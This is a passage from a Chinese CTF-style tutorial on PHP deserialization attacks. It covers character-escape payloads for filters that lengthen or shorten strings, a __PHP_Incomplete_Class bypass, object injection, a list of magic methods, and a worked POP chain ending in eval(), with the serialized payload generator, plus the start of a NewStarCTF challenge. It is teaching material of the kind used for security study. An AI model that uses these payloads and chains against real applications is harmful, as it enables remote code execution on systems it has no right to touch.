class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;xx&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;I am 11&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=<span class="subst">$new</span>[1]&quot;</span>;</span><br></pre></td></tr></table></figure></div><p>正常情况，传入 <code>name=mao</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/394sFvRJkYWAglS.png" alt="image.png"></p><p>如果此时多传入一个 x 的话会怎样，毫无疑问反序列化失败，由于溢出 (s 本来是 4 结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/im4EPGFUnTDd52o.png" alt="image.png"></p><p>那我们传入 <code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/Amz5WT7IJGrwKL3.png" alt="image.png"></p><p>传入 <code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code> <br> <code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>  这一部分一共二十个字符<br>由于一个 x 会被替换为两个，我们输入了一共 20 个 x，现在是 40 个，多出来的 20 个 x 其实取代了我们的这二十个字符 <code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code> ，从而造成 <code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>  的溢出，而 &quot; 闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出 <code>woaini</code> <br> 最后的；} 闭合反序列化全过程导致原来的 <code>&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</code>  被舍弃，不影响反序列化过程</p><h5 id="情况二过滤后字符变少"><a class="markdownIt-Anchor" href="#情况二过滤后字符变少">#</a> 情况二：过滤后字符变少</h5><p>例如：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new</span>[<span class="string">&#x27;age&#x27;</span>];</span><br></pre></td></tr></table></figure></div><p>正常情况传入 <code>name=mao&amp;age=11</code>  的结果</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/S8lKoWxiAdyDfna.png" alt="image.png"></p><p>构造一下</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/wrXv7GNB41Amlug.png" alt="image.png"></p><p>简单来说，就是前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码；<br>我们来看，这部分是 age 序列化后的结果</p><p>s:3:“age”;s:28:“11”;s:3:“age”;s:6:“woaini”;}&quot;</p><p>由于前面是 40 个 x 所以导致少了 20 个字符，所以需要后面来补上， <code>&quot;;s:3:&quot;age&quot;;s:28:&quot;</code> 11 这一部分刚好 20 个，后面由于有&quot; 闭合了前面因此后面的参数就可以由我们自定义执行了</p><h4 id="利用不完整类绕过序列化回旋镖"><a class="markdownIt-Anchor" href="#利用不完整类绕过序列化回旋镖">#</a> 利用不完整类绕过序列化回旋镖</h4><p>当存在  <code>serialize(unserialize($x)) != $x</code>  这种很神奇的东西时，我们可以利用不完整类  <code>__PHP_Incomplete_Class</code>  来进行处理</p><p>当我们尝试反序列化到一个不存在的类是，PHP 会使用  <code>__PHP_Incomplete_Class_Name</code>  这个追加的字段来进行存储</p><p>我们于是可以尝试自己构造一个不完整类</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$raw</span> = <span class="string">&#x27;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:1:&quot;F&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$exp</span> = <span class="string">&#x27;O:1:&quot;F&quot;:1:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$raw</span>)) == <span class="variable">$exp</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></div><p>这样就可以绕过了</p><p>更近一步，我们可以通过这个让一个对象被调用后凭空消失，只需要手动构造无 <code>__PHP_Incomplete_Class_Name</code>  的不完整对象</p><h5 id="serialize-函数在处理__php_incomplete_class对象时所进行的特殊操作"><a class="markdownIt-Anchor" href="#serialize-函数在处理__php_incomplete_class对象时所进行的特殊操作">#</a> serialize () 函数在处理 <code>__PHP_Incomplete_Class</code>  对象时所进行的特殊操作</h5><p>unserialize () 在发现当前 PHP 上下文中没有包含相关类的类定义时将创建一个  <code>__PHP_Incomplete_Class</code>  对象。而 serialize () 在发现需要进行序列化的对象是  <code>__PHP_Incomplete_Class</code>  后，将对其进行 特殊处理 以得到描述实际对象而非  <code>__PHP_Incomplete_Class</code>  对象的序列化文本，而这里就包含了 将属性的描述值减一 这一步。<br>那么对象所属类的名称是否会发生替换，序列化文本中的  <code>__PHP_Incomplete_Class_Name</code>  是否会被自动删除以使得序列化文本中的属性个数描述值与实际相符呢？对此，请参考如下示例：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:22:&quot;__PHP_Incomplete_Class&quot;:3:&#123;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:7:&quot;MyClass&quot;;s:4:&quot;name&quot;;s:8:&quot;RedHeart&quot;;s:6:&quot;nation&quot;;s:5:&quot;China&quot;;&#125;&#x27;</span>)));</span><br></pre></td></tr></table></figure></div><p>执行结果</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">69</span>) <span class="string">&quot;O:7:&quot;</span>MyClass<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:8:&quot;</span>RedHeart<span class="string">&quot;;s:6:&quot;</span>nation<span class="string">&quot;;s:5:&quot;</span>China<span class="string">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure></div><p>结合前面观察到的种种现象，我们可以总结出 serialize () 函数对 __PHP_Incomplete_Class 对象执行了如下 特殊操作（操作描述顺序并非 serialize 函数的实际操作顺序）：</p><p>将 <code> __PHP_Incomplete_Class</code>  对象中的 属性个数减一 并将其作为序列化文本中 对实际对象属性个数的描述值。<br>将  <code>__PHP_Incomplete_Class</code>  对象的 <code> __PHP_Incomplete_Class_Name</code>  作为序列化文本中 对象所属类的描述值。若未从  <code>__PHP_Incomplete_Class </code> 对象 中检查到  <code>__PHP_Incomplete_Class_Name</code>  属性，则跳过此步。<br>将  <code>__PHP_Incomplete_Class </code> 对象的序列化文本中对  <code>__PHP_Incomplete_Class_Name </code> 属性的描述删去。若没有发现相关描述，则跳过此步。</p><p>关于 <code>__PHP_Incomplete_Class</code>  更详细的介绍 &lt;<a class="link" href="https://blog.csdn.net/qq_44879989/article/details/133486308">PHP 反序列化漏洞：__PHP_Incomplete_Class 与 serialize (unserialize ($x)) !== $x <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>&gt;</p><h4 id="对象注入"><a class="markdownIt-Anchor" href="#对象注入">#</a> 对象注入</h4><p>当用户的请求在传给反序列化函数 <code>unserialize()</code>  之前没有被正确的过滤时就会产生漏洞。因为 PHP 允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的 <code>unserialize</code>  函数，最终导致一个在该应用范围内的任意 PHP 对象注入。</p><p><strong>对象漏洞</strong>出现得满足两个前提</p><blockquote><p>1、 <code>unserialize</code>  的参数可控。<br>2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。</p></blockquote><p>比如：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;y4mao&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:5:&quot;maomi&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure></div><p>在脚本运行结束后便会调用 <code>_destruct</code>  函数，同时会覆盖 test 变量输出 <code>maomi</code></p><h3 id="pop"><a class="markdownIt-Anchor" href="#pop">#</a> POP</h3><h4 id="魔法函数"><a class="markdownIt-Anchor" href="#魔法函数">#</a> ———— 魔法函数 ———</h4><p>我需要再次提出魔法函数并且需要细致的解释供我更加深刻的理解</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__construct() //构造函数, 在对应对象实例化时自动被调用. #子类中的构造函数不会隐式调用父类的构造函数.在 PHP 8 以前, 与类名同名的方法可以作为 __constuct 调用但 __construct 方法优先</span><br><span class="line">__destruct() //对象被销毁时触发（对象不再被引用（unset），脚本执行结束）（当存在__destruct时，头一般是他）</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据（比如访问private属性或者不存在的属性的值时）或者不存在这个键（$this-&gt;str[&#x27;str&#x27;]-&gt;source）都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发（输出一个对象、属性，将对象或属性与字符串拼接，对对象或属性进行正则匹配）</span><br><span class="line">__invoke() //当尝试将对象（属性）调用为函数时触发</span><br><span class="line">__debugInfo() //在使用 var_dump, print_r 时会被调用</span><br><span class="line">__set_state()   // 调用var_export()导出类时，此静态方法会被调用</span><br><span class="line">__clone()       // 当对象复制完成时调用</span><br><span class="line">__autoload()    // 尝试加载未定义的类</span><br></pre></td></tr></table></figure></div><p>会发现，我在很多魔法函数的触发方式的解释中对象后面都加了（属性），这与 php 官方手册和其他博客文章的解释有些许不同，在查找资料时产生了很多疑惑，比如我翻阅的其中一篇博客：</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/10/4YHGV9zljdy67vL.png" alt="5fd161f2f08ca123a0c6ccd8f4cc17cd.png"></p><p>原文说此处触发了 <code>__toString</code>  函数，可明明只是将属性当作字符串，</p><p>再比如同一篇文章的另一处：</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/10/Ktx4MPXFmGnZ7cS.png" alt="28258fc1d508554e89f8f7d99d3855b1.png"></p><p>触发了 <code>__invoke</code>  函数</p><p>在与小伙伴讨论之后，认为可以将属性看作对象</p><p>在弄清楚各种魔法函数触发条件之后就要开始构建 pop 链了</p><h4 id="pop链"><a class="markdownIt-Anchor" href="#pop链">#</a> POP 链</h4><p>POP 链构造首先就是要找到头和尾，也就是用户能传入参数的地方（头）和最终要执行函数方法的地方（尾）。找到头尾之后进行反推过程，从尾部开始一步步找到能触发上一步的地方，直到找到传参处，此时完整的 POP 链就显而易见了。CTF 赛中一般尾部就是 get flag 的方法，头部则是 GET/POST 传参</p><p>举个例子：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) // 1. <span class="title">destruct</span>函数为<span class="title">pop</span>链头</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source=<span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source; <span class="comment">//输出变量，把类当作字符串，触发__toString</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) // 2</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source; <span class="comment">//访问不存在的属性，触发_get</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uwant</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123; <span class="comment">// 3 </span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getshell</span>(<span class="variable">$this</span>-&gt;params); <span class="comment">//直接调用getshell</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getshell</span>(<span class="params"><span class="variable">$value</span></span>)  // 4</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;params); <span class="comment">//尾，输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]; <span class="comment">//GET传参头</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>先找链子的头和尾，头部明显是 GET 传参，尾部是 <code>Uwant</code>  类中的 <code>getshell</code> ，然后往上倒推， <code>Uwant</code>  类中的 <code>__get()</code>  中调用了 <code>getshell</code> ， <code>Show</code>  类中的 <code>toString</code>  调用了 <code>__get()</code> ，然后 <code>Hello</code>  类中的 <code>__destruct()</code> ，而我们 GET 传参之后会先进入 <code>__destruct()</code> ，这样子头和尾就连上了，所以说完整的链子就是：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">头 -&gt; Hello::__destruct() -&gt; Show::__toString() -&gt; Uwant::__get() -&gt; Uwant::getshell -&gt; 尾</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uwant</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Uwant</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; str = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div><h4 id="例题"><a class="markdownIt-Anchor" href="#例题">#</a> 例题</h4><h5 id="newstarctf-2023-week3-pop-gadget"><a class="markdownIt-Anchor" href="#newstarctf-2023-week3-pop-gadget">#</a> newstarctf 2023 week3 | POP Gadget</h5><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) //对象被销毁时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>; <span class="comment">//将对象当作字符串，可以触发__toString</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) //把对象当作字符串时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(); <span class="comment">//把对象当作方法（函数），触发__invoke</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>) //调用不可访问的方法时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>(); <span class="comment">//调用end函数</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) //将对象调用为函数时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>(); <span class="comment">//不存在getStr方法，触发__call</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>) //错误的<span class="title">end</span>函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span 